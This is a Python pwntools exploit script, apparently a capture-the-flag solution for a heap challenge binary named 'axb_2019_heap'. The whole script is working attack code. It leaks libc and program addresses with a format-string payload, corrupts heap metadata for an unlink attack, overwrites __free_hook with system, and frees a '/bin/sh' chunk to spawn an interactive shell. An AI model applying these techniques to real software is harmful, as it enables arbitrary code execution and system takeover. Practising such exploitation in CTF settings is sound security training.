from pwn import *
libc = ELF("./libc/libc-2.23.so")
p = process("./axb_2019_heap")
context.log_level = "debug"
#p = remote("node3.buuoj.cn",26984)

def dbg():
    gdb.attach(p)
    pause()
def choice(num):
	p.sendlineafter(":",str(num))

def add(id,size,text="aaaa\n"):
	choice(1)
	p.sendlineafter(":",str(id))
	p.sendlineafter(":",str(size))
	p.sendafter(":",text)

def delete(id):
	choice(2)
	p.sendlineafter(":",str(id))

def edit(id,text="aaaa\n"):
	choice(4)
	p.sendlineafter(":",str(id))
	p.sendafter(":",text)

#gdb.attach(p)
#p.sendlineafter("Enter your name: ","aaaaaaaa")
p.sendlineafter("Enter your name: ","%15$p,%19$p")
p.recvuntil("Hello, ")
libc_start_main = eval(p.recv(len("0x7fcd46b5f830")))-240
libc_base = libc_start_main - libc.symbols["__libc_start_main"]

log.warn("libc_start_main: "+ str(hex(libc_base)))

p.recvuntil(",")
base = eval(p.recv(len("0x7fcd46b5f830")))-0x116a
log.warn("base: "+ str(hex(base)))

note_addr = arry = 0x202060 + base
free_hook = libc_base + libc.symbols["__free_hook"]
system_addr = libc_base + libc.symbols["system"]

log.warn("note_addr: "+ str(hex(note_addr)))

add(0,0x90)
add(1,0x98)
add(2,0x90)
add(4,0x88,'/bin/sh\x00\n')

payload = p64(0)+ p64(0x80) +p64(note_addr-0x8) + p64(note_addr) +"\x00"*0x70 +p64(0x90) + "\xa0"

#+ p64(0x80) +"aaaaaaaa" + p64(0x90) + "\xa0"

#unlink
edit(1,payload)
delete(2)

dbg()

payload = p64(0) + p64(free_hook) +p64(8)
edit(1,payload+"\n")

#dbg()

edit(0 , p64(system_addr)+"\n" )

delete(4)

p.interactive()
